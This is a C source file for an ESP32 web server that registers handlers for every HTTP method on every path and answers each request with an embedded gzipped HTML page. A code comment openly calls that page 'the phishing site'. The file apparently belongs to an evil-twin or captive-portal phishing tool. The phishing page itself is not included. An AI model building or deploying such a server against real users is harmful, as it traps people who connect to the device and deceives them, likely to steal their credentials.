#include "web_server.h"

#include <sys/socket.h>

#include "esp_http_server.h"
#include "index_bin.h"

static httpd_handle_t server = NULL;

bool httpd_uri_matcher(const char *template_input, const char *uri,
                       size_t len) {
  const size_t tpl_len = strlen(template_input);
  size_t exact_match_chars = tpl_len;

  /* Check for trailing question mark and asterisk */
  const char last = tpl_len > 0 ? template_input[tpl_len - 1] : 0;
  const char prevlast = tpl_len > 1 ? template_input[tpl_len - 2] : 0;
  const bool asterisk = last == '*' || (prevlast == '*' && last == '?');
  const bool quest = last == '?' || (prevlast == '?' && last == '*');

  /* Minimum template_input string length must be:
   *      0 : if neither of '*' and '?' are present
   *      1 : if only '*' is present
   *      2 : if only '?' is present
   *      3 : if both are present
   *
   * The expression (asterisk + quest*2) serves as a
   * case wise generator of these length values
   */

  /* abort in cases such as "?" with no preceding character (invalid
   * template_input)
   */
  if (exact_match_chars < asterisk + quest * 2) {
    return false;
  }

  /* account for special characters and the optional character if "?" is used */
  exact_match_chars -= asterisk + quest * 2;

  if (len < exact_match_chars) {
    return false;
  }

  if (!quest) {
    if (!asterisk && len != exact_match_chars) {
      /* no special characters and different length - strncmp would return false
       */
      return false;
    }
    /* asterisk allows arbitrary trailing characters, we ignore these using
     * exact_match_chars as the length limit */
    return (strncmp(template_input, uri, exact_match_chars) == 0);
  } else {
    /* question mark present */
    if (len > exact_match_chars &&
        template_input[exact_match_chars] != uri[exact_match_chars]) {
      /* the optional character is present, but different */
      return false;
    }
    if (strncmp(template_input, uri, exact_match_chars) != 0) {
      /* the mandatory part differs */
      return false;
    }
    /* Now we know the URI is longer than the required part of template_input,
     * the mandatory part matches, and if the optional character is present, it
     * is correct. Match is OK if we have asterisk, i.e. any trailing characters
     * are OK, or if there are no characters beyond the optional character. */
    return asterisk || len <= exact_match_chars + 1;
  }
}

static esp_err_t web_server_root_handler(httpd_req_t *req) {
  printf("{WEB,SERVER_ROOT,}\n");
  /* Send the HTML page instead */
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
  httpd_resp_send(req, (const char *)index_bin, index_bin_len);
  return ESP_OK;
}

/*
 * Hook all different kinds of HTTP methods so the server always responds with
 * the phishing site regardless of the HTTP method
 */

static httpd_uri_t root_get = {.uri = "/*",
                               .method = HTTP_GET,
                               .handler = web_server_root_handler,
                               .user_ctx = NULL};

static httpd_uri_t root_post = {.uri = "/*",
                                .method = HTTP_POST,
                                .handler = web_server_root_handler,
                                .user_ctx = NULL};

static httpd_uri_t root_put = {.uri = "/*",
                               .method = HTTP_PUT,
                               .handler = web_server_root_handler,
                               .user_ctx = NULL};

static httpd_uri_t root_delete = {.uri = "/*",
                                  .method = HTTP_DELETE,
                                  .handler = web_server_root_handler,
                                  .user_ctx = NULL};

static httpd_uri_t root_options = {.uri = "/*",
                                   .method = HTTP_OPTIONS,
                                   .handler = web_server_root_handler,
                                   .user_ctx = NULL};

static httpd_uri_t root_trace = {.uri = "/*",
                                 .method = HTTP_TRACE,
                                 .handler = web_server_root_handler,
                                 .user_ctx = NULL};

static httpd_uri_t root_head = {.uri = "/*",
                                .method = HTTP_HEAD,
                                .handler = web_server_root_handler,
                                .user_ctx = NULL};

static httpd_uri_t root_connect = {.uri = "/*",
                                   .method = HTTP_CONNECT,
                                   .handler = web_server_root_handler,
                                   .user_ctx = NULL};

static httpd_uri_t root_patch = {.uri = "/*",
                                 .method = HTTP_PATCH,
                                 .handler = web_server_root_handler,
                                 .user_ctx = NULL};

void close_fd_cb(httpd_handle_t hd, int sockfd) {
  struct linger so_linger;
  so_linger.l_onoff = true;
  so_linger.l_linger = 0;
  int s = lwip_setsockopt(sockfd, SOL_SOCKET, SO_LINGER, &so_linger,
                          sizeof(so_linger));
  if (s < 0) {
    printf("web_server.close_fd_cb: Failed to set sock opt fd %d", sockfd);
  }

  int c = close(sockfd);
  if (c != 0) {
    printf("web_server.close_fd_cb: Failed to close sock fd %d", sockfd);
  }
}

void web_server_stop() {
  ESP_ERROR_CHECK(httpd_stop(server));
  server = NULL;
  printf("{WEB,STOPPED,}\n");
}

void web_server_start() {
  httpd_config_t config = HTTPD_DEFAULT_CONFIG();

  config.uri_match_fn = httpd_uri_matcher;
  config.enable_so_linger = false;
  config.close_fn = close_fd_cb;
  config.max_uri_handlers = 9;
  ESP_ERROR_CHECK(httpd_start(&server, &config));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_get));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_post));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_put));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_delete));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_options));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_trace));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_head));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_connect));
  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &root_patch));

  printf("{WEB,STARTED,}\n");
}